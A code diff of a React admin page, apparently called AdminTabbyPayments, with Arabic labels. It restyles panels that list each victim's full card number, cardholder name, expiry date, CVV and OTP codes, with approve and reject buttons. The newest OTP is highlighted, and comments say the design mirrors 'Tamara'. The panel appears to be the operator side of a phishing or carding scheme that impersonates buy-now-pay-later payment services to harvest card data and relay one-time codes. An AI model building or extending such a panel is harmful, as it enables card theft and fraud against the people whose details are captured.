@@ -341,21 +341,23 @@ const AdminTabbyPayments = () => {
                   </CardHeader>
 
                   <CardContent className="p-6">
-                    {/* معلومات أساسية */}
+                    {/* معلومات أساسية - تصميم محسّن */}
                     <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
-                      {payment.company && <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
-                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
-                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
-                            {payment.company}
-                          </div>
-                        </div>}
+                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                        <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
+                        <div className="font-bold text-sm text-gray-900 truncate" title={payment.company || 'غير متوفر'}>
+                          {payment.company || 'غير متوفر'}
+                        </div>
+                      </div>
                       
-                      {payment.phone && <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
+                      {payment.phone && (
+                        <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                           <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                           <div className="font-bold text-sm text-gray-900" dir="ltr">
                             {payment.phone}
                           </div>
-                        </div>}
+                        </div>
+                      )}
                       
                       <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                         <div className="text-xs text-green-600 font-medium mb-1">المبلغ الإجمالي</div>
@@ -365,82 +367,76 @@ const AdminTabbyPayments = () => {
                       </div>
                     </div>
 
-                    {/* محاولات الدفع المتعددة */}
+                    {/* محاولات الدفع المتعددة - بنفس تصميم تمارا */}
                     {paymentAttempts[payment.id] && paymentAttempts[payment.id].length > 0 && (
                       <div className="mb-6">
-                        <h3 className="text-lg font-bold mb-4 text-primary">بطاقات الدفع ({paymentAttempts[payment.id].length})</h3>
-                        <div className="space-y-4">
+                        <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600 mb-3">
+                          <CreditCard className="h-4 w-4" />
+                          محاولات الدفع ({paymentAttempts[payment.id].length})
+                        </h3>
+                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                           {paymentAttempts[payment.id].map((attempt, index) => (
-                            <div key={attempt.id} className="border-2 border-primary/20 rounded-xl p-4 bg-gradient-to-br from-gray-50 to-white">
-                              <div className="flex items-center justify-between mb-3">
-                                <div className="flex items-center gap-2">
-                                  <CreditCard className="h-5 w-5 text-primary" />
-                                  <span className="font-bold text-lg">بطاقة دفع #{index + 1}</span>
-                                </div>
+                            <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
+                              <div className="flex justify-between items-center mb-2">
+                                <span className="text-xs font-semibold text-orange-600">
+                                  محاولة #{paymentAttempts[payment.id]!.length - index}
+                                </span>
                                 {attempt.approval_status && (
-                                  <Badge className={attempt.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
+                                  <Badge className={attempt.approval_status === 'approved' ? 'bg-green-500 text-xs' : 'bg-red-500 text-xs'}>
                                     {attempt.approval_status === 'approved' ? 'موافق عليها' : 'مرفوضة'}
                                   </Badge>
                                 )}
                               </div>
-                              
-                              <div className="mb-4 p-4 bg-gradient-to-r from-gray-900 to-gray-700 rounded-xl text-white shadow-lg">
-                                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-                                  <div>
-                                    <div className="text-xs text-gray-400 mb-1">اسم حامل البطاقة</div>
-                                    <div className="font-bold text-lg">{attempt.cardholder_name}</div>
-                                  </div>
-                                  <div>
-                                    <div className="text-xs text-gray-400 mb-1">رقم البطاقة</div>
-                                    <div className="font-mono font-bold text-lg tracking-wider" dir="ltr">
-                                      {attempt.card_number}
-                                    </div>
-                                  </div>
-                                  <div>
-                                    <div className="text-xs text-gray-400 mb-1">تاريخ الانتهاء</div>
-                                    <div className="font-mono font-bold text-lg" dir="ltr">
-                                      {attempt.expiry_date}
-                                    </div>
-                                  </div>
-                                  <div>
-                                    <div className="text-xs text-gray-400 mb-1">CVV</div>
-                                    <div className="font-mono font-bold text-lg">
-                                      {attempt.cvv}
-                                    </div>
-                                  </div>
-                                  <div>
-                                    <div className="text-xs text-gray-400 mb-1">تاريخ الإدخال</div>
-                                    <div className="text-sm">
-                                      {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
-                                    </div>
-                                  </div>
+                              <div className="space-y-1.5 text-xs">
+                                <div className="flex justify-between">
+                                  <span className="text-gray-500">رقم البطاقة:</span>
+                                  <span className="font-mono font-medium" dir="ltr">
+                                    {attempt.card_number}
+                                  </span>
+                                </div>
+                                <div className="flex justify-between">
+                                  <span className="text-gray-500">الاسم:</span>
+                                  <span className="font-medium truncate max-w-[120px]" title={attempt.cardholder_name}>
+                                    {attempt.cardholder_name}
+                                  </span>
+                                </div>
+                                <div className="flex justify-between">
+                                  <span className="text-gray-500">الانتهاء:</span>
+                                  <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
+                                </div>
+                                <div className="flex justify-between">
+                                  <span className="text-gray-500">CVV:</span>
+                                  <span className="font-mono font-medium">{attempt.cvv}</span>
+                                </div>
+                                <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-orange-200">
+                                  {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                 </div>
                               </div>
 
                               {!attempt.approval_status && (
-                                <div className="flex gap-2">
-                                  <Button 
-                                    onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)} 
+                                <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
+                                  <Button
+                                    onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)}
                                     disabled={processing === attempt.id}
-                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white"
+                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                   >
                                     {processing === attempt.id ? (
-                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                                      <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                     ) : (
-                                      <Check className="h-4 w-4 ml-2" />
+                                      <Check className="h-3 w-3 ml-1" />
                                     )}
                                     موافقة
                                   </Button>
-                                  <Button 
-                                    onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)} 
+                                  <Button
+                                    onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)}
                                     disabled={processing === attempt.id}
                                     variant="destructive"
-                                    className="flex-1"
+                                    className="flex-1 h-8 text-xs"
                                   >
                                     {processing === attempt.id ? (
-                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                                      <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                     ) : (
-                                      <X className="h-4 w-4 ml-2" />
+                                      <X className="h-3 w-3 ml-1" />
                                     )}
                                     رفض
                                   </Button>
@@ -452,63 +448,81 @@ const AdminTabbyPayments = () => {
                       </div>
                     )}
 
-                    {/* أكواد التحقق المتعددة */}
+                    {/* أكواد التحقق النهائية - بنفس تصميم تمارا */}
                     {otpAttempts[payment.id] && otpAttempts[payment.id].length > 0 && (
-                      <div className="mb-6">
-                        <h3 className="text-lg font-bold mb-4 text-primary">أكواد التحقق ({otpAttempts[payment.id].length})</h3>
-                        <div className="space-y-4">
-                          {otpAttempts[payment.id].map((otp, index) => (
-                            <div key={otp.id} className="border-2 border-primary/20 rounded-xl p-4 bg-gradient-to-br from-primary/5 to-white">
-                              <div className="flex items-center justify-between mb-3">
-                                <span className="font-bold text-lg">كود تحقق #{index + 1}</span>
-                                {otp.approval_status && (
-                                  <Badge className={otp.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
-                                    {otp.approval_status === 'approved' ? 'موافق عليه' : 'مرفوض'}
-                                  </Badge>
+                      <div className="mt-6 p-4 bg-gradient-to-br from-purple-50 to-pink-50 rounded-xl border-2 border-purple-300">
+                        <h3 className="font-bold flex items-center gap-2 text-lg text-purple-700 mb-4">
+                          🔐 أكواد التحقق النهائية ({otpAttempts[payment.id].length})
+                        </h3>
+                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                          {otpAttempts[payment.id].map((otp, index) => {
+                            const isLatest = index === 0;
+                            return (
+                              <div 
+                                key={otp.id} 
+                                className={`border-2 rounded-xl p-4 transition-all ${
+                                  isLatest 
+                                    ? 'bg-gradient-to-br from-purple-100 to-pink-100 border-purple-400 shadow-lg ring-4 ring-purple-200' 
+                                    : 'bg-white border-gray-300'
+                                }`}
+                              >
+                                <div className="flex justify-between items-center mb-3">
+                                  <span className={`text-sm font-bold ${isLatest ? 'text-purple-700' : 'text-gray-600'}`}>
+                                    {isLatest ? '⭐ الأحدث' : `محاولة #${otpAttempts[payment.id]!.length - index}`}
+                                  </span>
+                                  {otp.approval_status && (
+                                    <Badge className={otp.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
+                                      {otp.approval_status === 'approved' ? 'موافق عليه' : 'مرفوض'}
+                                    </Badge>
+                                  )}
+                                </div>
+                                
+                                <div className="space-y-2">
+                                  <div className="flex justify-between items-center bg-white rounded-lg p-3 shadow-sm">
+                                    <span className="text-sm text-gray-600">كود التحقق:</span>
+                                    <span className={`font-mono font-bold text-2xl tracking-wider ${
+                                      isLatest ? 'text-purple-700' : 'text-gray-700'
+                                    }`}>
+                                      {otp.otp_code}
+                                    </span>
+                                  </div>
+                                  <div className="text-xs text-gray-600 text-center bg-white rounded-lg p-2">
+                                    {format(new Date(otp.created_at), 'PPp', { locale: ar })}
+                                  </div>
+                                </div>
+
+                                {!otp.approval_status && isLatest && (
+                                  <div className="flex gap-2 mt-3">
+                                    <Button 
+                                      onClick={() => handleApproveOtp(otp.id, payment.id)} 
+                                      disabled={processing === otp.id}
+                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs h-9"
+                                    >
+                                      {processing === otp.id ? (
+                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
+                                      ) : (
+                                        <Check className="h-3 w-3 ml-1" />
+                                      )}
+                                      موافقة
+                                    </Button>
+                                    <Button 
+                                      onClick={() => handleRejectOtp(otp.id, payment.id)} 
+                                      disabled={processing === otp.id}
+                                      variant="destructive"
+                                      className="flex-1 text-xs h-9"
+                                    >
+                                      {processing === otp.id ? (
+                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
+                                      ) : (
+                                        <X className="h-3 w-3 ml-1" />
+                                      )}
+                                      رفض
+                                    </Button>
+                                  </div>
                                 )}
                               </div>
-                              
-                              <div className="mb-4 p-4 bg-primary/10 border-2 border-primary rounded-lg">
-                                <div className="text-xs text-primary font-medium mb-2">كود التحقق (OTP)</div>
-                                <div className="font-bold text-3xl text-primary text-center tracking-widest">
-                                  {otp.otp_code}
-                                </div>
-                                <div className="text-xs text-gray-500 mt-2 text-center">
-                                  {format(new Date(otp.created_at), 'PPp', { locale: ar })}
-                                </div>
-                              </div>
-
-                              {!otp.approval_status && (
-                                <div className="flex gap-2">
-                                  <Button 
-                                    onClick={() => handleApproveOtp(otp.id, payment.id)} 
-                                    disabled={processing === otp.id}
-                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white"
-                                  >
-                                    {processing === otp.id ? (
-                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
-                                    ) : (
-                                      <Check className="h-4 w-4 ml-2" />
-                                    )}
-                                    موافقة على الكود
-                                  </Button>
-                                  <Button 
-                                    onClick={() => handleRejectOtp(otp.id, payment.id)} 
-                                    disabled={processing === otp.id}
-                                    variant="destructive"
-                                    className="flex-1"
-                                  >
-                                    {processing === otp.id ? (
-                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
-                                    ) : (
-                                      <X className="h-4 w-4 ml-2" />
-                                    )}
-                                    رفض الكود
-                                  </Button>
-                                </div>
-                              )}
-                            </div>
-                          ))}
+                            );
+                          })}
                         </div>
                       </div>
                     )}
